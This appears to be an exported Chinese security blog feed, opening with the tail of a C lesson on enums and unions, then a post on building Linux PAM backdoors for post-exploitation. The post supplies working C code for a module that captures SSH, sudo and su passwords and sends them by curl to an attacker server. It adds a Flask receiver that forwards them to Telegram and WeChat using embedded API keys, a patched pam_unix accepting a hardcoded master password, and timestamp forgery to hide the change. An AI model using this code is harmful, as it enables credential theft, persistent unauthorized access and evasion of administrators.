class="token operator">=</span> TYPE_CHAR or TYPE_FLOAT or TYPE_TEXT   <span class="token comment">//伪代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>enum eType test = TYPE_CHAR;</code><br><code>test</code>是枚举变量，枚举变量只能赋值为对应枚举类型中的枚举常量之一</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/***变体的前身，使用struct结构体、enum类型宏（标识）、union共用体（包含要实现的数据类型），**封装和实现get（取出内容）和set（复制操作）函数*/</span><span class="token keyword">struct</span> <span class="token class-name">tagScore</span><span class="token punctuation">{</span>    <span class="token keyword">enum</span> <span class="token punctuation">{</span> TYPE_CHAR<span class="token punctuation">,</span> TYPE_FLOAT<span class="token punctuation">,</span> TYPE_TEXT<span class="token punctuation">,</span> <span class="token comment">//这些叫做枚举常量，编译自动保持其唯一性</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">union</span> unScore <span class="token punctuation">{</span><span class="token keyword">char</span> chLevel<span class="token punctuation">;</span>    <span class="token keyword">float</span> fPoint<span class="token punctuation">;</span>    <span class="token keyword">char</span> szText<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Score<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <code>_variant_t</code>变体，实现可查看微软是何如封装的</p><hr><p>作业：</p><ul><li>get set show</li><li>语法题</li><li>预习堆操作的语法和函数调用</li></ul>]]></content>
      
      
      <categories>
          
          <category> CR逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux PAM后门学习</title>
      <link href="posts/32019.html"/>
      <url>posts/32019.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux后渗透笔记-PAM后门"><a href="#Linux后渗透笔记-PAM后门" class="headerlink" title="Linux后渗透笔记 PAM后门"></a>Linux后渗透笔记 PAM后门</h2><p>本笔记整理自互联网和本地试验</p><h3 id="PAM知识点"><a href="#PAM知识点" class="headerlink" title="PAM知识点"></a>PAM知识点</h3><p>Linux-PAM是可插入认证模块(Pluggable Authentication Modules)，PAM使用配置/etc/pam.d/下的文件，来管理对程序的认证方式。</p><p>根据/etc/pam.d/下的各种服务配置文件，调用/lib/security下相应的模块，以加载动态链接库的形式实现需要的认证方式。</p><h3 id="PAM后门密码推送【本地篇】"><a href="#PAM后门密码推送【本地篇】" class="headerlink" title="PAM后门密码推送【本地篇】"></a>PAM后门密码推送【本地篇】</h3><h4 id="查看系统和PAM版本"><a href="#查看系统和PAM版本" class="headerlink" title="查看系统和PAM版本"></a>查看系统和PAM版本</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getconf LONG_BIT<span class="token function">cat</span> /etc/redhat-release<span class="token function">rpm</span> -qa <span class="token operator">|</span> <span class="token function">grep</span> pam<span class="token function">apt-get</span> list --installed <span class="token operator">|</span> <span class="token function">grep</span> pam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/4162790754.png"></p><p>查看 vim /etc/ssh/sshd_config,确认UsePAM是否开启</p><pre class="line-numbers language-code" data-language="code"><code class="language-code">#UsePAM noUsePAM yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/2504756272.png"></p><p>在PAM源码中，pam_sm_authenticate函数对应认证服务，在这里截获密码。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAM_SM_AUTH</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;security/pam_appl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;security/pam_modules.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;syslog.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdarg.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_pam_log</span><span class="token punctuation">(</span><span class="token keyword">int</span> err<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    va_list args<span class="token punctuation">;</span>    <span class="token function">va_start</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// openlog("pam_authx", LOG_CONS|LOG_PID, LOG_AUTH);</span>    <span class="token function">vsyslog</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> format<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">va_end</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">closelog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_write_log</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>content<span class="token punctuation">)</span> <span class="token punctuation">{</span>    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> result <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>value <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> value <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>value <span class="token operator">&gt;=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> value <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ch<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>hex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> high<span class="token punctuation">,</span>low<span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> hex <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>ch<span class="token punctuation">;</span>        high <span class="token operator">=</span> tmp <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">;</span>        low <span class="token operator">=</span> tmp <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">;</span>        <span class="token operator">*</span>hex<span class="token operator">++</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span>hex<span class="token operator">++</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>low<span class="token punctuation">)</span><span class="token punctuation">;</span>        ch<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>hex <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">pam_sm_authenticate</span><span class="token punctuation">(</span><span class="token class-name">pam_handle_t</span> <span class="token operator">*</span>pamh<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>username<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>remotehost<span class="token punctuation">;</span>    <span class="token function">pam_get_item</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> PAM_USER<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pam_get_item</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> PAM_AUTHTOK<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pam_get_item</span><span class="token punctuation">(</span>pamh<span class="token punctuation">,</span> PAM_RHOST<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>remotehost<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> PAM_AUTHINFO_UNAVAIL<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 前提开启syslog，输出在debug，三种记录方式可选择注释</span>    <span class="token comment">//_pam_log(LOG_DEBUG, "ssh auth attempt: %s entered the password %s", username, password);</span>    <span class="token keyword">char</span> cmd<span class="token punctuation">[</span><span class="token number">300</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> password_hex<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 把密码转成HexString格式</span>    <span class="token function">str_to_hex</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> password_hex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 把密码输出至/tmp/.ssh/log，并且通过HTTP协议回源到服务器</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"curl -d 'msg="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"::"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> password_hex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//在实战中可把此处注释到，防止被管理员在/tmp目下发现异常</span>    <span class="token function">_write_log</span><span class="token punctuation">(</span><span class="token string">"/tmp/.ssh/log"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"::"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> remotehost<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"' 'http://your server ip:8443/ssh'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>PAM_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">pam_sm_setcred</span><span class="token punctuation">(</span><span class="token class-name">pam_handle_t</span> <span class="token operator">*</span>pamh<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>PAM_IGNORE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用gcc直接编译成动态链接库文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -fPIC -DPIC -shared -rdynamic -o pam_authx.so pam_authx.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="配置PAM后门"><a href="#配置PAM后门" class="headerlink" title="配置PAM后门"></a>配置PAM后门</h4><p>因为上面的代码只是针对pam_sm_authenticate函数的，为了快速编译而写的，所以还是需要用到pam_unix.so模块，它会把密码与/etc/shadow中的哈希对比。 接下来在/etc/pam.d/的对应配置文件首行加入下面两条配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Ubuntu</span>/etc/pam.d/common-auth-ys<span class="token comment"># CentOS</span>/etc/pam.d/sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-code" data-language="code"><code class="language-code">auth       required     pam_unix.soauth       required     pam_authx.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/sshd<span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/sudo<span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/su<span class="token function">sed</span> -i <span class="token string">"1iauth       required     pam_unix.so<span class="token entity" title="\n">\n</span>auth       required     pam_authx.so"</span> /etc/pam.d/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>下载目标编辑好的pam后门到目标计算机</p><h3 id="PAM后门密码推送【接收密码】"><a href="#PAM后门密码推送【接收密码】" class="headerlink" title="PAM后门密码推送【接收密码】"></a>PAM后门密码推送【接收密码】</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">from</span> flask <span class="token keyword">import</span> send_from_directory<span class="token keyword">import</span> requests<span class="token punctuation">,</span>binascii<span class="token keyword">import</span> os<span class="token comment"># nohup gunicorn -w 1 -b 0.0.0.0:8443 yourappname:app &gt; /dev/null 2&gt;&amp;1 &amp;</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/ssh"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ssh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        msg <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>to_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span>        msg <span class="token operator">=</span> msg<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"::"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        msg <span class="token operator">=</span> <span class="token string">"host: "</span> <span class="token operator">+</span> msg<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\nusername: "</span> <span class="token operator">+</span> msg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token operator">+</span> <span class="token string">"\npassword: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>msg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        sendMessage<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        sendMessage_Wechat<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"200"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/ssh"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">downloadssh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    directory <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>directory<span class="token punctuation">,</span> <span class="token string">"install_ssh.sh"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/authx"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">downloadauthx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    directory <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>directory<span class="token punctuation">,</span> <span class="token string">"pam_authx.so"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token operator">//</span>转发推送到telegarm机器人<span class="token keyword">def</span> <span class="token function">sendMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    apiKey <span class="token operator">=</span> <span class="token string">"1690803241:AAFlb3erITT3mAQXsWJyqky5-ppT1iLR0r8"</span>    userId <span class="token operator">=</span> <span class="token string">"1081557726"</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"chat_id"</span><span class="token punctuation">:</span>userId<span class="token punctuation">,</span><span class="token string">"text"</span><span class="token punctuation">:</span>msg<span class="token punctuation">}</span>    url <span class="token operator">=</span> <span class="token string">"https://api.telegram.org/bot{}/sendMessage"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>apiKey<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>json<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token operator">//</span>转发推送到微信，使用server酱api<span class="token keyword">def</span> <span class="token function">sendMessage_Wechat</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    SCKEY <span class="token operator">=</span> <span class="token string">"SCU90806Tcd03301290315424fa3c008bc5cc6735600505d0cf248"</span>    urlWechat <span class="token operator">=</span> <span class="token string">"https://sc.ftqq.com/{}.send"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>SCKEY<span class="token punctuation">)</span>    title <span class="token operator">=</span> <span class="token string">"有用户尝试登录"</span>    params<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'text'</span><span class="token punctuation">:</span>title<span class="token punctuation">,</span>        <span class="token string">'desp'</span><span class="token punctuation">:</span>msg    <span class="token punctuation">}</span>    rr <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urlWechat<span class="token punctuation">,</span>data <span class="token operator">=</span> params<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8443</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PAM后门-万能密码"><a href="#PAM后门-万能密码" class="headerlink" title="PAM后门 万能密码"></a>PAM后门 万能密码</h3><p>centos需要关闭selinux，临时关闭<code>setenforce 0</code>。永久关闭需要修改<code>/etc/selinux/config</code>，将其中SELINUX设置为disabled。</p><h4 id="下载对应PAM版本的"><a href="#下载对应PAM版本的" class="headerlink" title="下载对应PAM版本的"></a>下载对应PAM版本的</h4><p>下载对应源码:<a href="http://www.linux-pam.org/library/">http://www.linux-pam.org/library/</a></p><pre class="line-numbers language-bas" data-language="bas"><code class="language-bas">wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gztar zxvf Linux-PAM-1.1.8.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装gcc编译器和flex库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gcc flex flex-devel -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ubuntu系统同理</p><p>修改<code>Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c</code>源码实现自定义密码认证</p><p><img src="./medias/detail/load.gif" data-original="https://blog.ryzezr.com/usr/uploads/2021/05/1034017245.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/* verify the password of this user */retval <span class="token operator">=</span> _unix_verify_password<span class="token punctuation">(</span>pamh, name, p, ctrl<span class="token punctuation">)</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>strcmp<span class="token punctuation">(</span><span class="token string">"wannengmima"</span>,p<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>return PAM_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">}</span>name <span class="token operator">=</span> p <span class="token operator">=</span> NULL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编译成so动态链接库文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Linux-PAM-1.1.8./configure --prefix<span class="token operator">=</span>/user --exec-prefix<span class="token operator">=</span>/usr --localstatedir<span class="token operator">=</span>/var --sysconfdir<span class="token operator">=</span>/etc --disable-selinux --with-libiconv-prefix<span class="token operator">=</span>/usr<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>生成的恶意认证so路径在<code>./modules/pam_unix/.libs/pam_unix.so</code>。用它来替换系统自带的pam_unix.so。</p><p>因为系统不同位数不同，pam_unix.so的路径也不一样，尽量用find找一下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -name <span class="token string">"pam_unix.so"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后替换，注意先备份，万一恶意的so文件不可用就GG了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bak<span class="token function">cp</span> /root/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>此时切记不能断开ssh，再开一个终端ssh链接一下试试。</strong></p><p>成功登录，后门OK了，修改下pam_unix.so的时间戳，增加系统管理员查找难度</p><p>在<code>/usr/lib64/security/</code>下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> pam_unix.so -r pam_umask.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>整理自：</strong></p><p><a href="https://gorgias.me/2018/03/25/Linux-%E5%90%8E%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-PAM%E5%90%8E%E9%97%A8/">Linux-后渗透笔记-PAM后门</a><br><a href="https://mp.weixin.qq.com/s/M8chPphMprAK56-ScTQ-Qg">Linux 